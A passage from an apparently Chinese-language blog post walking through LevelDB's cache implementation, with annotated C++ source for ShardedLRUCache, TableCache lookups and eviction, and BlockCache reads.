&#123;</span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  LRUCache shard_[kNumShards];</span><br><span class="line">  port::Mutex id_mutex_;</span><br><span class="line">  <span class="keyword">uint64_t</span> last_id_;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">uint32_t</span> <span class="title">HashSlice</span><span class="params">(<span class="keyword">const</span> Slice&amp; s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Hash(s.data(), s.<span class="built_in">size</span>(), <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">uint32_t</span> <span class="title">Shard</span><span class="params">(<span class="keyword">uint32_t</span> hash)</span> </span>&#123; <span class="keyword">return</span> hash &gt;&gt; (<span class="number">32</span> - kNumShardBits); &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">ShardedLRUCache</span><span class="params">(<span class="keyword">size_t</span> capacity)</span> : <span class="title">last_id_</span><span class="params">(<span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> per_shard = (capacity + (kNumShards - <span class="number">1</span>)) / kNumShards;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> s = <span class="number">0</span>; s &lt; kNumShards; s++) &#123;</span><br><span class="line">      shard_[s].SetCapacity(per_shard);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ~ShardedLRUCache() <span class="keyword">override</span> &#123;&#125;</span><br><span class="line">  <span class="function">Handle* <span class="title">Insert</span><span class="params">(<span class="keyword">const</span> Slice&amp; key, <span class="keyword">void</span>* value, <span class="keyword">size_t</span> charge,</span></span></span><br><span class="line"><span class="function"><span class="params">                 <span class="keyword">void</span> (*deleter)(<span class="keyword">const</span> Slice&amp; key, <span class="keyword">void</span>* value))</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint32_t</span> hash = HashSlice(key);</span><br><span class="line">    <span class="keyword">return</span> shard_[Shard(hash)].Insert(key, hash, value, charge, deleter);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function">Handle* <span class="title">Lookup</span><span class="params">(<span class="keyword">const</span> Slice&amp; key)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint32_t</span> hash = HashSlice(key);</span><br><span class="line">    <span class="keyword">return</span> shard_[Shard(hash)].Lookup(key, hash);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Release</span><span class="params">(Handle* handle)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    LRUHandle* h = <span class="keyword">reinterpret_cast</span>&lt;LRUHandle*&gt;(handle);</span><br><span class="line">    shard_[Shard(h-&gt;hash)].Release(handle);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Erase</span><span class="params">(<span class="keyword">const</span> Slice&amp; key)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint32_t</span> hash = HashSlice(key);</span><br><span class="line">    shard_[Shard(hash)].Erase(key, hash);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span>* <span class="title">Value</span><span class="params">(Handle* handle)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;LRUHandle*&gt;(handle)-&gt;value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">uint64_t</span> <span class="title">NewId</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    <span class="function">MutexLock <span class="title">l</span><span class="params">(&amp;id_mutex_)</span></span>;</span><br><span class="line">    <span class="keyword">return</span> ++(last_id_);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Prune</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> s = <span class="number">0</span>; s &lt; kNumShards; s++) &#123;</span><br><span class="line">      shard_[s].Prune();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">size_t</span> <span class="title">TotalCharge</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> total = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> s = <span class="number">0</span>; s &lt; kNumShards; s++) &#123;</span><br><span class="line">      total += shard_[s].TotalCharge();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> total;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如何做到减少竞争带来的延迟的？现在有多个cache，对于每个插入的key，做一次hash，然后取hash结果的高4位作为cache id，用于选择此次用哪个cache来缓存数据。这样就避免了只使用一个cache时，每次插入都要加锁。</p><h2 id="5-Cache应用1-TableCache"><a href="#5-Cache应用1-TableCache" class="headerlink" title="5. Cache应用1-TableCache"></a>5. Cache应用1-TableCache</h2><p>tablecache cache的是<strong>多个sstable（不包含data block)</strong>。其key和value对应关系如下：</p><p><img data-src="https://pic.downk.cc/item/5f82b2b81cd1bbb86b3919c9.png" alt=""></p><p>TableCache中的cache容量为990. </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// Number of open files that can be used by the DB.  You may need to</span></span><br><span class="line"><span class="comment">// increase this if your database has a large working set (budget</span></span><br><span class="line"><span class="comment">// one open file per 2MB of working set).</span></span><br><span class="line"><span class="keyword">int</span> max_open_files = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> kNumNonTableCacheFiles = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">TableCacheSize</span><span class="params">(<span class="keyword">const</span> Options&amp; sanitized_options)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Reserve ten files or so for other uses and give the rest to TableCache.</span></span><br><span class="line">  <span class="keyword">return</span> sanitized_options.max_open_files - kNumNonTableCacheFiles;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是整个TableCache:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TableCache</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  TableCache(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; dbname, <span class="keyword">const</span> Options&amp; options, <span class="keyword">int</span> entries);</span><br><span class="line">  ~TableCache();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Return an iterator for the specified file number (the corresponding</span></span><br><span class="line">  <span class="comment">// file length must be exactly "file_size" bytes).  If "tableptr" is</span></span><br><span class="line">  <span class="comment">// non-null, also sets "*tableptr" to point to the Table object</span></span><br><span class="line">  <span class="comment">// underlying the returned iterator, or to nullptr if no Table object</span></span><br><span class="line">  <span class="comment">// underlies the returned iterator.  The returned "*tableptr" object is owned</span></span><br><span class="line">  <span class="comment">// by the cache and should not be deleted, and is valid for as long as the</span></span><br><span class="line">  <span class="comment">// returned iterator is live.</span></span><br><span class="line">  <span class="function">Iterator* <span class="title">NewIterator</span><span class="params">(<span class="keyword">const</span> ReadOptions&amp; options, <span class="keyword">uint64_t</span> file_number,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">uint64_t</span> file_size, Table** tableptr = <span class="literal">nullptr</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If a seek to internal key "k" in specified file finds an entry,</span></span><br><span class="line">  <span class="comment">// call (*handle_result)(arg, found_key, found_value).</span></span><br><span class="line">  <span class="function">Status <span class="title">Get</span><span class="params">(<span class="keyword">const</span> ReadOptions&amp; options, <span class="keyword">uint64_t</span> file_number,</span></span></span><br><span class="line"><span class="function"><span class="params">             <span class="keyword">uint64_t</span> file_size, <span class="keyword">const</span> Slice&amp; k, <span class="keyword">void</span>* arg,</span></span></span><br><span class="line"><span class="function"><span class="params">             <span class="keyword">void</span> (*handle_result)(<span class="keyword">void</span>*, <span class="keyword">const</span> Slice&amp;, <span class="keyword">const</span> Slice&amp;))</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Evict any entry for the specified file number</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Evict</span><span class="params">(<span class="keyword">uint64_t</span> file_number)</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="function">Status <span class="title">FindTable</span><span class="params">(<span class="keyword">uint64_t</span> file_number, <span class="keyword">uint64_t</span> file_size, Cache::Handle**)</span></span>;</span><br><span class="line"></span><br><span class="line">  Env* <span class="keyword">const</span> env_;</span><br><span class="line">  <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> dbname_;</span><br><span class="line">  <span class="keyword">const</span> Options&amp; options_;</span><br><span class="line">  Cache* cache_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="1-FindTable"><a href="#1-FindTable" class="headerlink" title="1. FindTable"></a>1. FindTable</h3><p>FindTable是在cache中根据指定filenumnber,lookup到相关cache的handle。如果找到了，直接返回该handle，如果没找到，则插入到cache中。</p><p><strong>此时的key是编码后的file_number. value是file_number对应的file指针以及打开后的sstable指针</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">TableCache::FindTable</span><span class="params">(<span class="keyword">uint64_t</span> file_number, <span class="keyword">uint64_t</span> file_size,</span></span></span><br><span class="line"><span class="function"><span class="params">                             Cache::Handle** handle)</span> </span>&#123;</span><br><span class="line">  Status s;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="keyword">sizeof</span>(file_number)];</span><br><span class="line">  EncodeFixed64(buf, file_number);</span><br><span class="line">  <span class="function">Slice <span class="title">key</span><span class="params">(buf, <span class="keyword">sizeof</span>(buf))</span></span>;</span><br><span class="line">   <span class="comment">// 在cache寻找key对应的handle</span></span><br><span class="line">  *handle = cache_-&gt;Lookup(key);</span><br><span class="line">  <span class="keyword">if</span> (*handle == <span class="literal">nullptr</span>) &#123;<span class="comment">// 找不到</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> fname = TableFileName(dbname_, file_number);</span><br><span class="line">    RandomAccessFile* file = <span class="literal">nullptr</span>;</span><br><span class="line">    Table* table = <span class="literal">nullptr</span>;</span><br><span class="line">      <span class="comment">// 根据fname打开file</span></span><br><span class="line">    s = env_-&gt;NewRandomAccessFile(fname, &amp;file);</span><br><span class="line">    <span class="keyword">if</span> (!s.ok()) &#123;</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span> old_fname = SSTTableFileName(dbname_, file_number);</span><br><span class="line">      <span class="keyword">if</span> (env_-&gt;NewRandomAccessFile(old_fname, &amp;file).ok()) &#123;</span><br><span class="line">        s = Status::OK();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">        <span class="comment">// 根据file打开table</span></span><br><span class="line">      s = Table::Open(options_, file, file_size, &amp;table);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!s.ok()) &#123;</span><br><span class="line">      assert(table == <span class="literal">nullptr</span>);</span><br><span class="line">      <span class="keyword">delete</span> file;</span><br><span class="line">      <span class="comment">// We do not cache error results so that if the error is transient,</span></span><br><span class="line">      <span class="comment">// or somebody repairs the file, we recover automatically.</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 插入到cache中</span></span><br><span class="line">      TableAndFile* tf = <span class="keyword">new</span> TableAndFile;</span><br><span class="line">      tf-&gt;file = file;</span><br><span class="line">      tf-&gt;table = table;</span><br><span class="line">      *handle = cache_-&gt;Insert(key, tf, <span class="number">1</span>, &amp;DeleteEntry);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/绘图文件-第 7 页.png" style="zoom:67%;" /><h3 id="2-Get"><a href="#2-Get" class="headerlink" title="2. Get"></a>2. Get</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="comment">// If a seek to internal key "k" in specified file finds an entry,</span></span><br><span class="line">  <span class="comment">// call (*handle_result)(arg, found_key, found_value).</span></span><br><span class="line"><span class="function">Status <span class="title">TableCache::Get</span><span class="params">(<span class="keyword">const</span> ReadOptions&amp; options, <span class="keyword">uint64_t</span> file_number,</span></span></span><br><span class="line"><span class="function"><span class="params">                       <span class="keyword">uint64_t</span> file_size, <span class="keyword">const</span> Slice&amp; k, <span class="keyword">void</span>* arg,</span></span></span><br><span class="line"><span class="function"><span class="params">                       <span class="keyword">void</span> (*handle_result)(<span class="keyword">void</span>*, <span class="keyword">const</span> Slice&amp;,</span></span></span><br><span class="line"><span class="function"><span class="params">                                             <span class="keyword">const</span> Slice&amp;))</span> </span>&#123;</span><br><span class="line">  Cache::Handle* handle = <span class="literal">nullptr</span>;</span><br><span class="line">  Status s = FindTable(file_number, file_size, &amp;handle);</span><br><span class="line">  <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">      <span class="comment">// 找到cache中的table</span></span><br><span class="line">    Table* t = <span class="keyword">reinterpret_cast</span>&lt;TableAndFile*&gt;(cache_-&gt;Value(handle))-&gt;table;</span><br><span class="line">      <span class="comment">// 在table内部寻找k，找到了对应data pair调用handle_result</span></span><br><span class="line">    s = t-&gt;InternalGet(options, k, arg, handle_result);</span><br><span class="line">    cache_-&gt;Release(handle);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">Table::InternalGet</span><span class="params">(<span class="keyword">const</span> ReadOptions&amp; options, <span class="keyword">const</span> Slice&amp; k, <span class="keyword">void</span>* arg,</span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="keyword">void</span> (*handle_result)(<span class="keyword">void</span>*, <span class="keyword">const</span> Slice&amp;,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                <span class="keyword">const</span> Slice&amp;))</span> </span>&#123;</span><br><span class="line">  Status s;</span><br><span class="line">   <span class="comment">// 生成index迭代器</span></span><br><span class="line">  Iterator* iiter = rep_-&gt;index_block-&gt;NewIterator(rep_-&gt;options.comparator);</span><br><span class="line">  iiter-&gt;Seek(k);</span><br><span class="line">  <span class="keyword">if</span> (iiter-&gt;Valid()) &#123;</span><br><span class="line">      <span class="comment">// 找到相关data block</span></span><br><span class="line">    Slice handle_value = iiter-&gt;value();</span><br><span class="line">    FilterBlockReader* filter = rep_-&gt;filter;</span><br><span class="line">    BlockHandle handle;</span><br><span class="line">    <span class="keyword">if</span> (filter != <span class="literal">nullptr</span> &amp;&amp; handle.DecodeFrom(&amp;handle_value).ok() &amp;&amp;</span><br><span class="line">        !filter-&gt;KeyMayMatch(handle.offset(), k)) &#123;<span class="comment">// 应用bloom filter检查给定key是否在这个data block中</span></span><br><span class="line">      <span class="comment">// Not found</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">// 可能在这个data block中</span></span><br><span class="line">       <span class="comment">// 将index的value转换为一个block iter</span></span><br><span class="line">      Iterator* block_iter = BlockReader(<span class="keyword">this</span>, options, iiter-&gt;value());</span><br><span class="line">      block_iter-&gt;Seek(k);</span><br><span class="line">      <span class="keyword">if</span> (block_iter-&gt;Valid()) &#123;<span class="comment">// 确实在这个data block中，调用handle_result函数（这里的arg可以是一个saver，用来保存找到的key和vlaue）</span></span><br><span class="line">        (*handle_result)(arg, block_iter-&gt;key(), block_iter-&gt;value());</span><br><span class="line">      &#125;</span><br><span class="line">      s = block_iter-&gt;status();</span><br><span class="line">      <span class="keyword">delete</span> block_iter;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">    s = iiter-&gt;status();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">delete</span> iiter;</span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/绘图文件-第 8 页.png" style="zoom: 50%;" /><h3 id="3-Evict"><a href="#3-Evict" class="headerlink" title="3. Evict"></a>3. Evict</h3><p>这个相对简单，直接在cache_中Erase即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TableCache::Evict</span><span class="params">(<span class="keyword">uint64_t</span> file_number)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="keyword">sizeof</span>(file_number)];</span><br><span class="line">  EncodeFixed64(buf, file_number);</span><br><span class="line">  cache_-&gt;Erase(Slice(buf, <span class="keyword">sizeof</span>(buf)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-NewIterator"><a href="#4-NewIterator" class="headerlink" title="4.NewIterator"></a>4.NewIterator</h3><p>根据cache找到table，根据table返回iterator。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Iterator* <span class="title">TableCache::NewIterator</span><span class="params">(<span class="keyword">const</span> ReadOptions&amp; options,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  <span class="keyword">uint64_t</span> file_number, <span class="keyword">uint64_t</span> file_size,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  Table** tableptr)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (tableptr != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    *tableptr = <span class="literal">nullptr</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Cache::Handle* handle = <span class="literal">nullptr</span>;</span><br><span class="line">  Status s = FindTable(file_number, file_size, &amp;handle);</span><br><span class="line">  <span class="keyword">if</span> (!s.ok()) &#123;</span><br><span class="line">    <span class="keyword">return</span> NewErrorIterator(s);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Table* table = <span class="keyword">reinterpret_cast</span>&lt;TableAndFile*&gt;(cache_-&gt;Value(handle))-&gt;table;</span><br><span class="line">  Iterator* result = table-&gt;NewIterator(options);</span><br><span class="line">  result-&gt;RegisterCleanup(&amp;UnrefEntry, cache_, handle);</span><br><span class="line">  <span class="keyword">if</span> (tableptr != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    *tableptr = table;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里用到了TwoLevelIterator</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Iterator* <span class="title">Table::NewIterator</span><span class="params">(<span class="keyword">const</span> ReadOptions&amp; options)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> NewTwoLevelIterator(</span><br><span class="line">      rep_-&gt;index_block-&gt;NewIterator(rep_-&gt;options.comparator),</span><br><span class="line">      &amp;Table::BlockReader, <span class="keyword">const_cast</span>&lt;Table*&gt;(<span class="keyword">this</span>), options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>TwoLevelIterator</strong>用index_iter和data_iter来访问数据。</p><p><strong>index_iter为index_block的 Block::Iter。</strong></p><p><strong>data_iter为 data block的Block::Iter。</strong></p><h2 id="6-Cache应用2-BlockCache"><a href="#6-Cache应用2-BlockCache" class="headerlink" title="6. Cache应用2-BlockCache"></a>6. Cache应用2-BlockCache</h2><p>BlockCache用于cache sstable中的datablock。系统默认为8M. </p><p><strong>key为 cahceid+data block的位置信息(offset)。</strong></p><p><strong>value 为 data block的block封装（解压后）。</strong></p><p>![](<span class="exturl" data-url="aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3JhdmVueHJ6L1BpY0JlZC9pbWcv57uY5Zu+5paH5Lu2LeesrA==" title="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/绘图文件-第">https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/绘图文件-第<i class="fa fa-external-link"></i></span> 9 页 (1).png)</p><h3 id="1-BlockCache的初始化"><a href="#1-BlockCache的初始化" class="headerlink" title="1. BlockCache的初始化"></a>1. BlockCache的初始化</h3><p>blockcache的默认初始化在SanitizeOptions中：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Options <span class="title">SanitizeOptions</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; dbname,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">const</span> InternalKeyComparator* icmp,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">const</span> InternalFilterPolicy* ipolicy,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">const</span> Options&amp; src)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (result.block_cache == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">      <span class="comment">// block cache 的 capacity 为 8M</span></span><br><span class="line">    result.block_cache = NewLRUCache(<span class="number">8</span> &lt;&lt; <span class="number">20</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-Block-Cache的读取与插入"><a href="#2-Block-Cache的读取与插入" class="headerlink" title="2. Block Cache的读取与插入"></a>2. Block Cache的读取与插入</h3><pre><code>目前仅在Table::BlockReader看到使用。所以以这个函数来讲解。</code></pre><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Convert an index iterator value (i.e., an encoded BlockHandle)</span></span><br><span class="line"><span class="comment">// into an iterator over the contents of the corresponding block.</span></span><br><span class="line"><span class="function">Iterator* <span class="title">Table::BlockReader</span><span class="params">(<span class="keyword">void</span>* arg, <span class="keyword">const</span> ReadOptions&amp; options,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">const</span> Slice&amp; index_value)</span> </span>&#123;</span><br><span class="line">  Table* table = <span class="keyword">reinterpret_cast</span>&lt;Table*&gt;(arg);</span><br><span class="line">    <span class="comment">// 获取 block_cache</span></span><br><span class="line">  Cache* block_cache = table-&gt;rep_-&gt;options.block_cache;</span><br><span class="line">  Block* block = <span class="literal">nullptr</span>;</span><br><span class="line">  Cache::Handle* cache_handle = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">  BlockHandle handle;</span><br><span class="line">  Slice input = index_value;</span><br><span class="line">  Status s = handle.DecodeFrom(&amp;input);</span><br><span class="line">  <span class="comment">// We intentionally allow extra stuff in index_value so that we</span></span><br><span class="line">  <span class="comment">// can add more features in the future.</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">    BlockContents contents;</span><br><span class="line">    <span class="keyword">if</span> (block_cache != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">      <span class="keyword">char</span> cache_key_buffer[<span class="number">16</span>];</span><br><span class="line">      EncodeFixed64(cache_key_buffer, table-&gt;rep_-&gt;cache_id);</span><br><span class="line">      EncodeFixed64(cache_key_buffer + <span class="number">8</span>, handle.offset());</span><br><span class="line">      <span class="function">Slice <span class="title">key</span><span class="params">(cache_key_buffer, <span class="keyword">sizeof</span>(cache_key_buffer))</span></span>;</span><br><span class="line">      cache_handle = block_cache-&gt;Lookup(key);</span><br><span class="line">      <span class="keyword">if</span> (cache_handle != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        block = <span class="keyword">reinterpret_cast</span>&lt;Block*&gt;(block_cache-&gt;Value(cache_handle));</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span 